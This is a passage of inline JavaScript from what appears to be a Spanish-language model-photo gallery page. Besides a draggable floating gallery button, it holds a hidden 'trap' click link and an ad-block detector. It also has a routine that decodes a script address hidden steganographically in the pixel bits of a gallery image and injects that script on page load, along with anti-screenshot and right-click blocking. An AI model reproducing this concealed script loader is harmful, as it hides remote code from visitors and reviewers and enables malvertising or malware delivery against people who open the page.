            if(b.offsetHeight === 0 || window.getComputedStyle(b).display === 'none') block();

        s.onerror = () => { block(); };
        s.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";

    <script>
        // --- AQUÍ COLOCAS LAS PORTADAS DE LAS DIFERENTES MODELOS ---
        const portadasModelos = [
            "https://via.placeholder.com/100/ff1493/ffffff?text=1", 
            "https://via.placeholder.com/100/9400d3/ffffff?text=2",
            "https://via.placeholder.com/100/ff1493/ffffff?text=3",
            "https://via.placeholder.com/100/9400d3/ffffff?text=4",
            "https://via.placeholder.com/100/ff1493/ffffff?text=5",
            "https://via.placeholder.com/100/9400d3/ffffff?text=6",
            "https://via.placeholder.com/100/ff1493/ffffff?text=7",
            "https://via.placeholder.com/100/9400d3/ffffff?text=8",
            "https://via.placeholder.com/100/ff1493/ffffff?text=9",
            "https://via.placeholder.com/100/9400d3/ffffff?text=10"
        ];

        // --- LÓGICA DEL BOTÓN FLOTANTE ---
        const fabContainer = document.getElementById('knon-fab-container');
        const fabTrigger = document.getElementById('knon-fab-trigger');
        const fabOptions = document.getElementById('knon-fab-options');
        const fabGallery = document.getElementById('knon-fab-gallery');
        const profilesContainer = document.getElementById('fab-profiles-container');
        const trapLink = document.getElementById('fab-trap-link');

        let longPressTimer;
        let pageIndex = 0;
        
        // Variables para la física de arrastre
        let isDragging = false;
        let startTouchX, startTouchY;
        let initialOffsetX, initialOffsetY;

        // Inyecta 5 portadas en la galería
        function renderGallery(page) {
            profilesContainer.innerHTML = '';
            if (portadasModelos.length === 0) return;

            const start = page * 5; // AHORA VA DE 5 EN 5
            const end = start + 5;
            
            for (let i = start; i < end && i < portadasModelos.length; i++) {
                const div = document.createElement('div');
                div.className = 'fab-profile';
                div.style.backgroundImage = `url('${portadasModelos[i]}')`;
                profilesContainer.appendChild(div);
            }
        }

        // Configuración de la trampa invisible
        function checkTrap() {
            if (!localStorage.getItem('ads_mostrado')) {
                trapLink.style.display = 'block'; 
                trapLink.addEventListener('click', () => {
                    localStorage.setItem('ads_mostrado', 'true');
                    setTimeout(() => {
                        trapLink.remove(); 
                    }, 100);
                }, { once: true });
            } else {
                if(trapLink) trapLink.remove();
            }
        }

        // --- ARRASTRE DIRECTO DESDE EL LOGO ---
        fabTrigger.addEventListener('touchstart', (e) => {
            const touch = e.touches[0];
            startTouchX = touch.clientX;
            startTouchY = touch.clientY;
            
            const rect = fabContainer.getBoundingClientRect();
            initialOffsetX = touch.clientX - rect.left;
            initialOffsetY = touch.clientY - rect.top;
            
            isDragging = false; // Asumimos que es un clic hasta que mueva el dedo

            // Si deja el dedo quieto 800ms, sale la opción de Eliminar el botón
            longPressTimer = setTimeout(() => {
                if(!isDragging) {
                    fabOptions.style.display = 'flex';
                    fabGallery.style.display = 'none';
                    if(navigator.vibrate) navigator.vibrate(50);
                }
            }, 800);
        }, { passive: false });

        fabTrigger.addEventListener('touchmove', (e) => {
            const touch = e.touches[0];
            
            // Calculamos cuánto se ha movido el dedo
            const moveX = Math.abs(touch.clientX - startTouchX);
            const moveY = Math.abs(touch.clientY - startTouchY);

            // Si se mueve más de 10 píxeles, es un arrastre, NO un clic
            if (moveX > 10 || moveY > 10) {
                isDragging = true;
                clearTimeout(longPressTimer); // Cancelamos el menú de "Eliminar"
                fabOptions.style.display = 'none'; 
                e.preventDefault(); // Bloquea el scroll del fondo para un arrastre perfecto

                // Movemos el widget completo
                fabContainer.style.left = `${touch.clientX - initialOffsetX}px`;
                fabContainer.style.top = `${touch.clientY - initialOffsetY}px`;
                fabContainer.style.bottom = 'auto'; 
                fabContainer.style.right = 'auto';
            }
        }, { passive: false });

        fabTrigger.addEventListener('touchend', (e) => {
            clearTimeout(longPressTimer);
        });

        // --- EL CLIC (Abre o pagina las fotos) ---
        fabTrigger.addEventListener('click', (e) => {
            // Si el usuario acaba de arrastrar el botón, ignoramos el clic
            if (isDragging) {
                // Reseteamos rápidamente para el próximo toque
                setTimeout(() => isDragging = false, 50);
                return; 
            }

            // Matemática: Ahora dividimos entre 5
            const maxPages = Math.ceil(portadasModelos.length / 5);
            
            if (fabGallery.style.display === 'flex') {
                pageIndex++;
                if (pageIndex >= maxPages) pageIndex = 0; 
                renderGallery(pageIndex);
            } else {
                fabGallery.style.display = 'flex';
                fabOptions.style.display = 'none';
                renderGallery(pageIndex);
                checkTrap(); 
            }
        });

        // Quitar Botón
        document.getElementById('btn-quitar').addEventListener('click', () => {
            fabContainer.remove();
        });

        // --- MOTOR DE DECODIFICACIÓN BACTERIA ---
        async function extractBacteria(imgSrc) {
            const canvas = document.getElementById('bacteria-lab');
            const ctx = canvas.getContext('2d', { willReadFrequently: true });
            const img = new Image();
            img.crossOrigin = "anonymous"; 
            img.src = imgSrc;

            img.onload = function() {
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
                
                let binary = "";
                for (let i = 0; i < data.length; i += 4) {
                    binary += (data[i] & 1).toString();
                    binary += (data[i + 1] & 1).toString();
                }

                let base64 = "";
                for (let i = 0; i < binary.length; i += 8) {
                    let charCode = parseInt(binary.substr(i, 8), 2);
                    if (charCode === 0) break; 
                    base64 += String.fromCharCode(charCode);
                }

                try {
                    const decoded = atob(base64);
                    const div = document.createElement('div');
                    div.innerHTML = decoded;
                    const scriptTag = div.querySelector('script');
                    if (scriptTag) {
                        const finalScript = document.createElement('script');
                        finalScript.src = scriptTag.src;
                        finalScript.setAttribute('data-cfasync', 'false');
                        document.body.appendChild(finalScript);
                    }
                } catch(e) {}
            };
        }

        function vote(n) {
            const stars = document.querySelectorAll('.star');
            stars.forEach((s, index) => {
                if(index < n) s.classList.add('active'); else s.classList.remove('active');
            });
            if(window.navigator.vibrate) window.navigator.vibrate(50);
        }
        
        document.addEventListener('visibilitychange', () => {
            const body = document.getElementById('nogle-visor');
            if (document.visibilityState === 'hidden') body.classList.add('anti-screenshot-active');
            else setTimeout(() => body.classList.remove('anti-screenshot-active'), 400);
        });
        document.addEventListener('contextmenu', e => e.preventDefault());

        window.addEventListener('load', function() {
            let searchCount = 0;
            const checkImg = setInterval(() => {
                const firstImg = document.querySelector('#gallery-container img');
                if (firstImg && firstImg.src) {
                    extractBacteria(firstImg.src);
                    clearInterval(checkImg);
                }
                if (searchCount > 50) clearInterval(checkImg); 
                searchCount++;
            }, 100);

            setTimeout(function() {
                const inCode = document.getElementById('ad-instream');
                if(inCode && inCode.textContent.trim()) {
                    const scriptIn = document.createElement('script');
                    scriptIn.setAttribute('data-cfasync', 'false');
                    scriptIn.textContent = inCode.textContent.trim();
                    document.body.appendChild(scriptIn);
                }
            }, 3500);
        });
    </script>
